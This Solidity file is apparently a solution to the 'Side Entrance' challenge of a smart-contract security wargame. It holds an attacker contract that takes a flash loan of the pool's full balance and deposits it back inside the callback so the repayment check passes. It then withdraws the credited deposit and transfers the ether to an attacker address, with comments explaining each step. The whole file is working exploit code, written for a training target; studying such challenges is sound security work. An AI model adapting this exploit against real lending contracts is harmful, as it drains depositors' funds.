// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private _pool;
    uint256 private _poolBalance;

    constructor(address poolAddress) {
        _pool = SideEntranceLenderPool(poolAddress);
        _poolBalance = address(_pool).balance;
    }

    function execute() external payable override {
        console.log("execute()", msg.sender, msg.value);
        _pool.deposit{value: _poolBalance}();
    }

    function attack(
        address payable attackerEOA
    ) public {
        console.log("attack()", attackerEOA, _poolBalance, address(_pool));
        // borrow the total amount available in the pool. This will send the borrowed amount
        // to our `execute()` function, which then deposits back into the pool as
        // an available deposit, which also puts it back in the pool, so the
        // balance check at the end of `flashLoan()` passes.
        _pool.flashLoan(_poolBalance);
        // Now that we have the borrowed amount as a deposit in the pool,
        // we can `withdraw()` without causing a revert.
        _pool.withdraw();
        // and now we can transfer the tokens to another address and it's
        // gone forever.
        attackerEOA.transfer(_poolBalance);
    }

    // needed for pool.withdraw() to work
    receive() external payable {}
}